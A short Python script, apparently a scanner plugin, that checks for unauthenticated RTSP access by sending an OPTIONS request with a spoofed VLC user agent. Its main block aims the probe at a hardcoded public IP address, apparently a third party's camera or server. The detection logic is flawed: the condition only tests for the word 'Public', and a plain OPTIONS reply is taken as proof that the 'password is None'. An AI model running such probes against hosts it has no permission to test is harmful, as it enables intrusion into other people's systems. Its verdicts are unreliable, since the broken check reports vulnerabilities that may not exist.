#-*- coding: utf-8 -*-

import socket,time,string,random


def genmsg_OPTIONS(url,seq,userAgent):
    msgRet = "OPTIONS " + url + " RTSP/1.0\r\n"
    msgRet += "CSeq: " + str(seq) + "\r\n"
    msgRet += "User-Agent: " + userAgent + "\r\n"
    msgRet += "\r\n"
    msgRet = msgRet.encode(encoding="utf-8")
    return msgRet

def verify(protocol,ip,port):
    host = ip+':'+str(port)
    timeout = 3
    print('testing if rtsp unauthorized access vul')
    try:
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,int(port)))
        seq = 1
        defaultTestUrl = "rtsp://"+ip+"/"
        defaultUserAgent = "LibVLC/2.0.3 (LIVE555 Streaming Media v2011.12.23)"
        s.send(genmsg_OPTIONS(defaultTestUrl, seq, defaultUserAgent))
        bufLen = 1024 * 10
        result_content = s.recv(bufLen)
        s.close()
        print(result_content)
        if b"RTSP/1.0 200 OK" and b"Public" in result_content:
            msg = 'There is a rtsp unauthorized access vul , password is None'
            print(msg)
            number = 'v123'
            return True, host, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,host,number,msg
    msg = 'There is no rtsp unauthorized access vul'
    number = 'v0'
    return False, host, number, msg

if __name__ == '__main__':
    res = verify('http','60.174.156.204',554)
    print(res)